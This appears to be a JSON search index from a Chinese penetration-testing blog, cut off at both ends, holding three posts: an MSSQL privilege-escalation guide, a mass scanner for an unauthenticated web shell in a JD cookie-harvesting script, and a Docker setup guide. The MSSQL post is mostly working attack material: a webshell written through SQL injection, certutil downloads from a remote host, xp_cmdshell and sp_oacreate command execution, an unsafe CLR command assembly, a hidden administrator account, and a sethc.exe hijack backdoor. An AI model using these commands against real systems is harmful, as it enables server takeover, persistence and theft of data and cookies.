Language=\u0026quot;Jscript\u0026quot;%^\u0026gt;^\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%^\u0026gt; \u0026gt; c:\\\\WWW\\\\404.aspx' ;\r 由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载\n远程下载文件\rcertutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;\r命令：\rhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;' ;\r#加密\rcertutil -encode test.aspx out.txt\r解密\rcertutil -decode c:\\windows\\Temp\\out.txt c:\\wwwroot\\asp\\aspx.aspx\r1.首先在本地使用certutil加密，将加密后的内容复制出来\recho PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== \u0026gt; C:\\tmp\\shell.txt\r2.解密\rcertutil -f -decode \u0026quot;C:\\tmp\\shell.txt\u0026quot; \u0026quot;C:\\tmp\\shell.jsp\u0026quot;\r使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：\rcertutil -urlcache *\r执行删除缓存\rcertutil -urlcache * delete\r 差异备份拿shell backup database 库名 to disk = 'c:\\bak.bak';--\rcreate table [dbo].[test] ([cmd] [image]);\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\r log备份拿shell LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\nalter database 库名 set RECOVERY FULL create table cmd (a image) backup log 库名 to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r log备份的好处就是备份出来的webshell的文件大小非常的小\n提权 xpcmdshell提权  xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除\n 0x01 xp_cmdshell简介 xp``_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp``_cmdshell来进行提权\n影响范围：\n只要该数据库存在该组件，就可以利用\n0x02 xp_cmdshell使用 1. 查看xp_cmdshell状态 判断xpcmdshell权限\ndeclare @RunningOnACluster char(1)\rdeclare @xp_cmdshell_available char(1)\rdeclare @result int set @xp_cmdshell_available='Y' set @result=0\rselect @RunningOnACluster=case when convert(int, serverproperty('IsClustered')) = 1 then 'Y'\relse 'N' end if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))\rset @xp_cmdshell_available='N' if @RunningOnACluster='Y' begin\rif @xp_cmdshell_available='Y'\rselect @result=1\rif @xp_cmdshell_available='N'\rselect @result=2\rend\rselect @result\r 返回1表示xp_cmdshell组件启用，返回0则表示未启用。\n恢复xp_cmdshell存储过程\n解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。\r第一步先删除：\rdrop procedure sp_addextendedproc\rdrop procedure sp_oacreate\rexec sp_dropextendedproc 'xp_cmdshell'\r第二步恢复：\rdbcc addextendedproc(\u0026quot;sp_oacreate\u0026quot;,\u0026quot;odsole70.dll\u0026quot;)\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot; \u0026quot;)\r直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot;xplog70.dll\u0026quot;)\r代码判断一系列存储过程是否存在，若不存在则恢复。\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))\rdbcc addextendedproc ('xp_cmdshell','xplog70.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))\rdbcc addextendedproc ('xp_dirtree','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))\rdbcc addextendedproc ('xp_fixeddrives','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))\rdbcc addextendedproc ('xp_regread','xpstar.dll')\r 2.开启xp_cmdshell存储过程 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;\r 3.xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令\nexec master.dbo.xp_cmdshell 'whoami'\rexec master.dbo.xp_cmdshell \u0026quot;whoami\u0026quot;\rexec xp_cmdshell \u0026quot;whoami\u0026quot;;\r 4.关闭xp_cmdshell存储过程 关闭xp_cmdshell配置\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\r 删除xp_cmdshell的语句:\nexec sp_dropextendedproc 'xp_cmdshell';\r 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。\ndrop procedure xp_cmdshell;\rexec sp_addextendedproc \u0026quot;xp_cmdshell\u0026quot;, \u0026quot;xplog70.dll\u0026quot;;\r 附录\nexec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\rexec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\rexec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'\r 简单总结：\nxp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。\r启用：\rEXEC sp_configure 'show advanced options', 1\rRECONFIGURE;\rEXEC sp_configure 'xp_cmdshell', 1;\rRECONFIGURE;\r关闭：\rexec sp_configure 'show advanced options', 1;\rreconfigure;\rexec sp_configure 'xp_cmdshell', 0;\rreconfigure;\r删除：\rexec sp_dropextendedproc 'xp_cmdshell';\r执行：\rEXEC master.dbo.xp_cmdshell '命令'\r如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复\rexec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'\r SP_OACREATE 0x01 sp_oacreate简介  调用wscript.shel执行命令\n sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。\n系统管理员使用sp_configure启用sp_oacreate和sp_oamethod系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）\n在效果方面，sp_oacreate、sp_oamethod两个过程和xp_cmdshell过程功能类似，因此可以替换使用！\n利用条件：\n 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）\n2.sqlserver允许远程连接\n3.OLE Automation Procedures选项开启\n 0x02 sp_oacreate使用 1.查看SP_OACREATE状态 我们可以在master.dbo.sysobjects中查看SP_OACREATE状态\nselect * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 2.判断SP_OACREATE是否存在 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 利用count(*)判断是否存在，存在即返回1。\n3.启用SP_OACREATE 利用sp_configure存储过程，启用SP_OACREATE\nexec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;\r 4.利用SP_OACREATE执行命令 利用SP_OACREATE执行系统命令\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r 此利用方法无回显\n5.关闭组件命令 exec sp_configure 'show advanced options',1;\rreconfigure;\rexec sp_configure 'Ole Automation Procedures',0;\rreconfigure;\r 简单总结\n判断SP_OACREATE是否存在\rselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r启用：\rEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 关闭：\rEXEC sp_configure 'show advanced options', 1;\rRECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; 执行：\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。\r CLR提权 0x01 CLR简介 CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。\n更多概念详见下方官方链接：\nhttps://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15\n0x02 编写CLR 利用VS创建MSSQL数据库项目\n修改目标平台和勾选创建脚本\n在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：\nCREATE ASSEMBLY SQLCLRTest FROM 'C:\\MyDBApp\\SQLCLRTest.dll' WITH PERMISSION_SET = SAFE;\r 其权限集有三个选项：\nSAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。\nEXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。\nUNSAFE：允许使用任何代码。\n微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration\n根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。\n创建SQL CLR C# 存储过程\n写入代码\nusing System;\rusing System.Data;\rusing System.Data.SqlClient;\rusing System.Data.SqlTypes;\rusing System.Diagnostics;\rusing System.Text;\rusing Microsoft.SqlServer.Server;\rpublic partial class StoredProcedures\r{\r[Microsoft.SqlServer.Server.SqlProcedure]\rpublic static void ExecCommand (string cmd)\r{\r// 在此处放置代码\rSqlContext.Pipe.Send(\u0026quot;Command is running, please wait.\u0026quot;);\rSqlContext.Pipe.Send(RunCommand(\u0026quot;cmd.exe\u0026quot;, \u0026quot; /c \u0026quot; + cmd));\r}\rpublic static string RunCommand(string filename,string arguments)\r{\rvar process = new Process();\rprocess.StartInfo.FileName = filename;\rif (!string.IsNullOrEmpty(arguments))\r{\rprocess.StartInfo.Arguments = arguments;\r}\rprocess.StartInfo.CreateNoWindow = true;\rprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\rprocess.StartInfo.UseShellExecute = false;\rprocess.StartInfo.RedirectStandardError = true;\rprocess.StartInfo.RedirectStandardOutput = true;\rvar stdOutput = new StringBuilder();\rprocess.OutputDataReceived += (sender, args) =\u0026gt; stdOutput.AppendLine(args.Data);\rstring stdError = null;\rtry\r{\rprocess.Start();\rprocess.BeginOutputReadLine();\rstdError = process.StandardError.ReadToEnd();\rprocess.WaitForExit();\r}\rcatch (Exception e)\r{\rSqlContext.Pipe.Send(e.Message);\r}\rif (process.ExitCode == 0)\r{\rSqlContext.Pipe.Send(stdOutput.ToString());\r}\relse\r{\rvar message = new StringBuilder();\rif (!string.IsNullOrEmpty(stdError))\r{\rmessage.AppendLine(stdError);\r}\rif (stdOutput.Length != 0)\r{\rmessage.AppendLine(\u0026quot;Std output:\u0026quot;);\rmessage.AppendLine(stdOutput.ToString());\r}\rSqlContext.Pipe.Send(filename + arguments + \u0026quot; finished with exit code = \u0026quot; + process.ExitCode + \u0026quot;: \u0026quot; + message);\r}\rreturn stdOutput.ToString();\r}\r}\r 编译成功后\n将以下文件保存为dll.ps1(需要修改dll路径)\n$assemblyFile = \u0026quot;C:\\Users\\Administrator\\Desktop\\dll\\sysinfo.dll\u0026quot;\r$stringBuilder = New-Object -Type System.Text.StringBuilder\r$stringBuilder.AppendLine(\u0026quot;use msdb;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;alter database master set trustworthy on;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\u0026quot;) | Out-Null\r$stringBuilder.Append(\u0026quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x\u0026quot;) | Out-Null\r$fileStream = [IO.File]::OpenRead($assemblyFile) while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(\u0026quot;X2\u0026quot;)) | Out-Null }\r$stringBuilder.AppendLine(\u0026quot;`n WITH PERMISSION_SET = UNSAFE;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec dbo.ExecCommand 'whoami /all';\u0026quot;) | Out-Null $stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.ToString() -join \u0026quot;\u0026quot; | Out-File C:\\Users\\Administrator\\Desktop\\dll\\exec.txt\r 输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）\npwershell -exec bypass ./dll.ps1\r 打开可看到提权SQL语句，分别运行每一条SQL语句\n进入msdb数据库\nuse msdb;\r 0x03 将存储.Net程序集的数据库配置为可信赖的。 alter database master set trustworthy on;\r 0x04 启用MSSQL CLR功能 exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\r命令解释：\rexec sp_configure 'show advanced options',1; #显示高级选项：\rreconfigure; #重新配置\rexec sp_configure 'clr enabled',1; # 开启clr enabled 选项\rreconfigure; #重新配置\r--关闭所有服务器配置选项\rEXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE\r--如果存在权限问题，执行下面一段脚本\ralter database [master] set TRUSTWORTHY on\rEXEC sp_changedbowner 'sa'\r 0x05 利用SQL语句导入程序集 CREATE ASSEMBLY [Database1]\rAUTHORIZATION [dbo]\rFROM 0x0000\rWITH PERMISSION_SET = UNSAFE;\rGO\r 0x06 创建存储过程 CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\r 0x07 执行命令 执行系统命令，查看当前的权限\nexec dbo.ExecCommand 'whoami';\r 沙盒提权 什么是沙盒？\n沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。\n利用前提：\n 1.需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂\n2.dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备\n 提权操作\n简单总结\n--提权语句\rexec sp_configure 'show advanced options',1;reconfigure;\r-- 不开启的话在执行xp_regwrite会提示让我们开启，\rexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;\r--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。\rexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;\r--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。\rexec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'\r--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net user margin margin /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net localgroup administrators margin /add\u0026quot;)')\r沙盒模式SandBoxMode参数含义（默认是2）\r`0`：在任何所有者中禁止启用安全模式\r`1` ：为仅在允许范围内\r`2` ：必须在access模式下\r`3`：完全开启\ropenrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。\r--恢复配置\r--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;\r--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;\r--exec sp_configure 'show advanced options',0;reconfigure;\r 引用前辈们的话\n 1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令\n 利用镜像劫持提权 0x01 简介 通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。\n前提条件：\n 1.未禁止注册表编辑（即写入功能）\n2.xp_regwrite启用\n 0x02 映像劫持提权 1.查看xp_regwrite是否启用 select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'\r 返回1表示xp_regwrite组件启用 返回0则表示未启用\n2.xp_regwrite开启与关闭 EXEC sp_configure 'show advanced options', 1\rRECONFIGURE\rEXEC sp_configure 'xp_regwrite',1\rRECONFIGURE\r 3.利用regwrite函数修改组注册表进行劫持 首先我们利用regwrite函数修改组册表进行劫持，这里如果regwrite执行失败参考上面的开启方法。\nEXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\\windows\\system32\\cmd.exe'\r 4.查看是否劫持成功 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger'\r 5.验证是否成功 紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口\n拓展：\n上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作\n6.删除指定注册表键值 删除粘滞键的键值\nxp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\r 利用Agent Job执行命令 0x01 简介 SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。\n原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。\nJob执行命令 1.启动sqlagent服务 首先需要启动sqlagent服务：\nexec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'\r 2.进入数据库 USE msdb;  3.定义创建作业 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1';  4.定义作业步骤 定义作业步骤(作业中查看当前用户并将用户写入c:\\1.txt文件中)\nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami \u0026gt;c:\\\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';  5.启动作业 启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。\nEXEC dbo.sp_start_job N'test_powershell_job1';\r 6.验证是否成功 参考地址：\nhttps://www.freebuf.com/vuls/276814.html\rhttps://y4er.com/post/mssql-getshell/\rhttps://f5.pm/go-26046.html\rhttp://alexsel.com/index.php/archives/80/\rhttps://xz.aliyun.com/t/9475\r ","id":6,"section":"posts","summary":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整","tags":["MSSQL","内网渗透"],"title":"MSSQL获取shell和提权","uri":"https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"0x01 漏洞检测 漏洞payload: http://IP/shell\n0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问\n通过该漏洞获取容器中的root权限, 可通过容器逃逸获取宿主机权限\n读取的京东cookie\n以下为批量脚本, 代码比较粗糙,大佬勿喷\n# -*- coding: utf-8 -*-\r# @Time : 2021/6/30 9:07\r# @Author : AD钙奶\rimport json\rimport re\rimport time\rimport requests\rimport ssl\rimport threadpool\rfrom loguru import logger\rtry:\rrequests.packages.urllib3.disable_warnings()\r_create_unverified_https_context = ssl._create_unverified_context\rexcept AttributeError:\rpass\relse:\rssl._create_default_https_context = _create_unverified_https_context\rdef brute_force(_url):\rurls = _url + '/shell'\rheaders = {\r\u0026quot;Accept\u0026quot;: \u0026quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026quot;,\r\u0026quot;Accept-Encoding\u0026quot;: \u0026quot;gzip, deflate\u0026quot;,\r\u0026quot;Accept-Language\u0026quot;: \u0026quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026quot;,\r\u0026quot;Cache-Control\u0026quot;: \u0026quot;max-age=0\u0026quot;,\r\u0026quot;Connection\u0026quot;: \u0026quot;keep-alive\u0026quot;,\r\u0026quot;Cookie\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;Upgrade-Insecure-Requests\u0026quot;: \u0026quot;1\u0026quot;,\r\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59\u0026quot;,\r}\rtry:\rresp = requests.get(url=urls, headers=headers, timeout=20)\rif resp.status_code == 200 and resp.headers['Set-Cookie']:\rinfo1 = f\u0026quot;系统存在未授权漏洞，存在漏洞的网站: {str(urls)}\u0026quot;\rfilename1 = time.strftime(\u0026quot;%Y-%m-%d-\u0026quot;) + 'vuln_存在未授权.txt'\rsave_vuln(filename1, info1)\rlogger.info(info1)\rexcept Exception as e:\rpass\rdef save_vuln(filename, info1):\rfile_path = './result/' + filename\rwith open(file_path, \u0026quot;a\u0026quot;) as f:\rinfo1 = info1 + '\\n'\rf.write(info1)\rdef open_file():\rwith open(\u0026quot;url3.txt\u0026quot;, 'r', encoding='UTF-8') as f:\rurls = f.readlines()\rurls = [url.strip() for url in urls if url and url.strip()]\rreturn urls\rdef main():\rurl = open_file()\rpool = threadpool.ThreadPool(200)\rthread = threadpool.makeRequests(brute_force, url)\r[pool.putRequest(req) for req in thread]\rpool.wait()\rif __name__ == '__main__':\rmain()\r ","id":7,"section":"posts","summary":"0x01 漏洞检测 漏洞payload: http://IP/shell 0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问 通","tags":["漏洞复现","web安全"],"title":"JD羊毛脚本漏洞","uri":"https://ad-calcium.github.io/2021/07/jd%E7%BE%8A%E6%AF%9B%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"1.下载docker-19.03.8.tgz\nwget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz\r 2.解压 docker-19.03.8.tgz\ntar -xvf docker-19.03.8.tgz\r 复制  sudo cp docker/* /usr/bin/\r 4.复制一下内容到 vim /etc/systemd/system/docker.service\n\r[Unit]\rDescription=Docker Application Container Engine\rDocumentation=https://docs.docker.com\rAfter=network-online.target firewalld.service\rWants=network-online.target\r[Service]\rType=notify\r# the default is not to use systemd for cgroups because the delegate issues still\r# exists and systemd currently does not support the cgroup feature set required\r# for containers run by docker\rExecStart=/usr/bin/dockerd\rExecReload=/bin/kill -s HUP $MAINPID\r# Having non-zero Limit*s causes performance problems due to accounting overhead\r# in the kernel. We recommend using cgroups to do container-local accounting.\rLimitNOFILE=infinity\rLimitNPROC=infinity\rLimitCORE=infinity\r# Uncomment TasksMax if your systemd version supports it.\r# Only systemd 226 and above support this version.\r#TasksMax=infinity\rTimeoutStartSec=0\r# set delegate yes so that systemd does not reset the cgroups of docker containers\rDelegate=yes\r# kill only the docker process, not all processes in the cgroup\rKillMode=process\r# restart the docker process if it exits prematurely\rRestart=on-failure\rStartLimitBurst=3\rStartLimitInterval=60s\r[Install]\rWantedBy=multi-user.target\r 5.加载文件 使其生效\nsystemctl daemon-reload  6.重启动docker\nsystemctl restart docker  7.开机自启docker命令\nsystemctl enable docker\r 8.重启系统检查服务是否正在运行\nps -aux | grep docker\r 9.检查服务是否开机启动\nsystemctl is-enabled docker.service  如果docker开机未自启，按照以下命令重新设置开启自启\n1.将服务配置成开机启动\nsystemctl enable docker.service  2.启动服务\nsystemctl start docker.service  Docker更换国内镜像源\n修改/etc/docker/daemon.json配置文件\ncat \u0026lt;\u0026lt; 'EOF' \u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://registry.docker-cn.com\u0026quot;,\u0026quot;http://hub-mirror.c.163.com\u0026quot; ],\r\u0026quot;exec-opts\u0026quot;: [\u0026quot;native.cgroupdriver=systemd\u0026quot;],\r\u0026quot;log-driver\u0026quot;: \u0026quot;json-file\u0026quot;,\r\u0026quot;log-opts\u0026quot;: {\r\u0026quot;max-size\u0026quot;: \u0026quot;50m\u0026quot;\r},\r\u0026quot;storage-driver\u0026quot;: \u0026quot;overlay2\u0026quot;,\r\u0026quot;storage-opts\u0026quot;: [\r\u0026quot;overlay2.override_kernel_check=true\u0026quot;\r]\r}\rEOF\r 容器开机启动： 创建容器时候指定restart参数：\ndocker run -it -p 6379:6379 --restart=always --name redis -d redis\r docker自启\ndocker run -d --name phpmyadmin -p 80:80 --restart=always 44924:latest\r 对已经创建的容器用docker update 更新:\ndocker update --restart=always xxx\r--restart具体参数值详细信息 :\rno - 容器退出时，不重启容器\ron-failure - 只有在非0状态退出时才从新启动容器\ralways - 无论退出状态是如何，都重启容器\r 安装docker-compose （1）首先访问 docker-compose 的 GitHub 版本发布页面：\n https://github.com/docker/compose/releases  （2）由于服务器是 CentOS 系统，则下载 Linux 版本的 Compose：\n（3）将下载下来的“docker-compose-Linux-x86_64”文件上传到服务器上，然后执行如下命令将其移动到 /usr/local/bin，并改名为“docker-compose”。\nmv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose\r （4）接着执行如下命令添加可执行权限：\nchmod +x /usr/local/bin/docker-compose\r （5）最后使用 docker-compose -v 命令测试是否安装成功（如果提示“没有那个文件或目录”可以重启下服务器再试试）：\nkail安装好docker之后 构建容器可能会报错，使用以下命令解决该问题\nsudo mkdir /sys/fs/cgroup/systemd\rsudo mount -t cgroup -o none,name=systemd cgroup /sys/fs/cgroup/systemd\r ","id":8,"section":"posts","summary":"1.下载docker-19.03.8.tgz wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz 2.解压 docker-19.03.8.tgz tar -xvf docker-19.03.8.tgz 复制 sudo cp docker/* /usr/bin/ 4.复制一下内容到 vim /etc/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service Wants=network-online.target [Service] Type=notify # the default is 